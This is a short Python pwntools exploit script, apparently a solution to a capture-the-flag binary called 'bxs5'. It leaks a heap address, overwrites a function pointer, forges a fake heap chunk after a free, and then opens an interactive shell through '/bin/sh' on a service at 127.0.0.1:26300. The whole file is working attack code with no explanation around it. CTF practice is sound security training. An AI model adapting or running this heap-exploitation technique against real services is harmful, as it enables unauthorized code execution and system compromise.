from pwn import *

#context.log_level = 'debug'
elf = ELF("./bxs5")
LOCAL = False

def tb_choice(index, option):
    io.recvuntil("3. Mizell")
    io.sendline(str(index))
    io.recvuntil("4: create your story")
    io.sendline(str(option))

def tb_getinfo(index, length):
    tb_choice(index, 1)
    io.recvuntil("want to read?")
    io.sendline(str(length))

def tb_changeinfo(index, atk, matk, story):
    tb_choice(index, 2)
    io.recvuntil("atk:")
    io.sendline(str(atk))
    io.recvuntil("matk:")
    io.sendline(str(matk))
    io.recvuntil("story")
    io.sendline(story)

def tb_delete(index):
    tb_choice(index, 3)

def tb_tellstory(length, story):
    tb_choice(1, 4)
    io.recvuntil("how long of your story?")
    io.sendline(str(length))
    io.recvuntil("story23333")
    io.send(story)

def tb_leak():
    tb_getinfo(1, 0xa8)
    data = io.recvuntil("\nGood")
    fake_chunk = data[0x70:-13]
    heap_addr =  u64(data[-13:-5])
    log.info("heap address: " + hex(heap_addr))
    raw_input("how?")
    tb_changeinfo(2, 30, 0x10, "23333333"+chr(0x0c)*8+p64(0x400BF6))
    tb_delete(2)
    fake_chunk = p64(heap_addr+0x08) + fake_chunk[8:]
    tb_tellstory(0x40, fake_chunk.ljust(0x40, chr(0)))
    raw_input("how?")
    tb_changeinfo(2, 30, 0x10, "/bin/sh")
    io.interactive()
    
def tb_pwn():
    tb_leak()

if __name__ == '__main__':
    if LOCAL:
        io = process('./bxs5')
    else:
        io = remote('127.0.0.1', 26300)
    raw_input("start")
    tb_pwn()
    raw_input("end")
    io.close()


